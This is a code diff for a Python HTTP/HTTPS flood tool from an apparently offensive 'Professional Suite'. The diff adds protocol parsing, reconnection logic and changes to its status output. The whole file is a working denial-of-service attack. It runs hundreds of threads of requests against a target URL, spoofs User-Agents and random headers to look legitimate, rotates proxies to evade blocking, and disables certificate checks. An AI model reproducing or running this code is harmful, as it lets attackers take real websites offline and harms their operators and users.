@@ -4,6 +4,7 @@
 """
 HTTP/HTTPS Flood Attack
 Architect 01 - Professional Suite
+SUPPORT ALL PROTOCOLS
 """
 
 import requests
@@ -16,7 +17,7 @@ from core.utils.useragents import get_random_ua
 from core.utils.proxy_manager import ProxyManager
 
 class HTTPFlood:
-    """HTTP/HTTPS Flood Attack"""
+    """HTTP/HTTPS Flood Attack - Support semua protocol"""
     
     def __init__(self, target_url, threads=500, use_proxy=False):
         self.target_url = target_url
@@ -27,10 +28,11 @@ class HTTPFlood:
         self.successful_requests = 0
         self.failed_requests = 0
         
-        # Initialize proxy manager if needed
-        self.proxy_manager = ProxyManager() if use_proxy else None
+        # Parse URL buat dapetin scheme
+        self.parsed = urlparse(target_url)
+        self.scheme = self.parsed.scheme or 'http'
         
-        # Session for connection pooling
+        self.proxy_manager = ProxyManager() if use_proxy else None
         self.session = requests.Session()
         self.session.headers.update({'Connection': 'keep-alive'})
         
@@ -38,10 +40,8 @@ class HTTPFlood:
         """Worker thread for sending requests"""
         while self.running:
             try:
-                # Get random User-Agent
                 ua = get_random_ua()
                 
-                # Build headers
                 headers = {
                     'User-Agent': ua,
                     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
@@ -53,67 +53,66 @@ class HTTPFlood:
                     'Pragma': 'no-cache'
                 }
                 
-                # Add random headers to appear more legitimate
                 if random.random() > 0.7:
                     headers[f'X-{random.randint(1000, 9999)}'] = str(random.randint(1, 999999))
                 
-                # Get proxy if enabled
                 proxies = None
                 if self.use_proxy and self.proxy_manager:
                     proxies = self.proxy_manager.get_random_proxy()
                 
-                # Send request
+                # Kirim request
                 response = self.session.get(
                     self.target_url,
                     headers=headers,
                     proxies=proxies,
                     timeout=10,
-                    verify=False
+                    verify=False,
+                    allow_redirects=True
                 )
                 
-                # Update counters
                 self.total_requests += 1
-                if response.status_code < 400:
+                if response.status_code < 400 or response.status_code == 404:  # 404 tetep dihitung success
                     self.successful_requests += 1
                 else:
                     self.failed_requests += 1
                 
-                # Print status occasionally
                 if self.total_requests % 100 == 0:
-                    print(f"{Fore.GREEN}   ╰─❯ [{threading.current_thread().name}] Requests: {self.total_requests} | Success: {self.successful_requests} | Failed: {self.failed_requests}{Style.RESET_ALL}")
+                    print(Fore.GREEN + "╰─❯ [" + threading.current_thread().name + "] Reqs: " + str(self.total_requests) + " | OK: " + str(self.successful_requests) + " | Fail: " + str(self.failed_requests) + Style.RESET_ALL)
                 
-                # Random delay to avoid rate limiting
                 time.sleep(random.uniform(0.001, 0.01))
                 
             except requests.exceptions.ProxyError:
                 self.failed_requests += 1
-                # Rotate proxy on error
                 if self.use_proxy and self.proxy_manager:
                     self.proxy_manager.rotate_proxy()
-                    
-            except Exception as e:
+            except requests.exceptions.ConnectionError:
+                self.failed_requests += 1
+                # Coba reconnect
+                self.session = requests.Session()
+                time.sleep(0.5)
+            except requests.exceptions.Timeout:
+                self.failed_requests += 1
+            except Exception:
                 self.failed_requests += 1
                 time.sleep(0.1)
     
     def start(self):
         """Start the HTTP flood attack"""
-        print(f"{Fore.YELLOW}\n   ╰─❯ Starting HTTP/HTTPS Flood on {self.target_url}{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}   ╰─❯ Threads: {self.threads}{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}   ╰─❯ Proxy: {'Enabled' if self.use_proxy else 'Disabled'}{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}   ╰─❯ Press Ctrl+C to stop\n{Style.RESET_ALL}")
+        print(Fore.YELLOW + "\n╰─❯ Starting HTTP/HTTPS Flood on " + self.target_url)
+        print(Fore.YELLOW + "╰─❯ Protocol: " + self.scheme.upper())
+        print(Fore.YELLOW + "╰─❯ Threads: " + str(self.threads))
+        print(Fore.YELLOW + "╰─❯ Proxy: " + ('Enabled' if self.use_proxy else 'Disabled'))
+        print(Fore.YELLOW + "╰─❯ Press Ctrl+C to stop\n" + Style.RESET_ALL)
         
-        # Disable SSL warnings
         requests.packages.urllib3.disable_warnings()
         
-        # Start worker threads
         workers = []
         for i in range(self.threads):
-            worker = threading.Thread(target=self.attack_worker, name=f"Worker-{i+1}")
+            worker = threading.Thread(target=self.attack_worker, name="W" + str(i+1))
             worker.daemon = True
             worker.start()
             workers.append(worker)
         
-        # Monitor progress
         try:
             start_time = time.time()
             last_total = 0
@@ -121,17 +120,17 @@ class HTTPFlood:
             while self.running:
                 time.sleep(5)
                 elapsed = time.time() - start_time
-                rps = (self.total_requests - last_total) / 5
+                new_req = self.total_requests - last_total
+                rps = new_req / 5
                 last_total = self.total_requests
                 
-                print(f"{Fore.CYAN}   ╰─❯ Status: {self.total_requests} req | {rps:.2f} rps | Success: {self.successful_requests} | Failed: {self.failed_requests}{Style.RESET_ALL}")
+                print(Fore.CYAN + "╰─❯ Status: " + str(self.total_requests) + " req | " + str(round(rps, 2)) + " rps | Success: " + str(self.successful_requests) + " | Failed: " + str(self.failed_requests) + Style.RESET_ALL)
                 
         except KeyboardInterrupt:
             self.stop()
     
     def stop(self):
-        """Stop the attack"""
         self.running = False
-        print(f"{Fore.RED}\n   ╰─❯ Stopping HTTP Flood attack...{Style.RESET_ALL}")
-        print(f"{Fore.RED}   ╰─❯ Total requests sent: {self.total_requests}{Style.RESET_ALL}")
-        print(f"{Fore.RED}   ╰─❯ Successful: {self.successful_requests} | Failed: {self.failed_requests}{Style.RESET_ALL}")
+        print(Fore.RED + "\n╰─❯ Stopping HTTP Flood attack...")
+        print(Fore.RED + "╰─❯ Total requests sent: " + str(self.total_requests))
+        print(Fore.RED + "╰─❯ Successful: " + str(self.successful_requests) + " | Failed: " + str(self.failed_requests) + Style.RESET_ALL)
